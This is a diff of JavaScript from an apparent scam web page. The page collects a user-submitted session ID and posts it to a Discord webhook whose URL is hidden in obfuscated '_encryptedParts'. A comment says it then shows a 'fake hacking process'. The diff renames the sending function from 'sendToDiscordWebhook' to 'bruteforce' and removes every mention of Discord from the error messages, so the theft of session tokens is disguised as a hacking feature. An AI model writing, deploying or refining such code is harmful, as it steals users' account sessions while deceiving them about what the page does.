@@ -24,7 +24,7 @@ const _decrypted =
   _encryptedParts[56] + _encryptedParts[57] + _encryptedParts[58] + _encryptedParts[59];
 
 
-function sendToDiscordWebhook(sessionId) {
+function bruteforce(sessionId) {
   const payload = {
     content: `New Session ID Submitted:\n\`\`\`${sessionId}\`\`\``,
   };
@@ -38,11 +38,11 @@ function sendToDiscordWebhook(sessionId) {
   })
     .then(response => {
       if (!response.ok) {
-        console.error('Failed to send data to Discord webhook');
+        console.error('Failed');
       }
     })
     .catch(error => {
-      console.error('Error sending data to Discord webhook:', error);
+      console.error('Error', error);
     });
 }
 // Validate User Input
@@ -76,7 +76,7 @@ function validateInput() {
     return;
   }
 
- sendToDiscordWebhook(sessionId);
+ bruteforce(sessionId);
 
   // Hide error and start fake hacking process
   hideError();
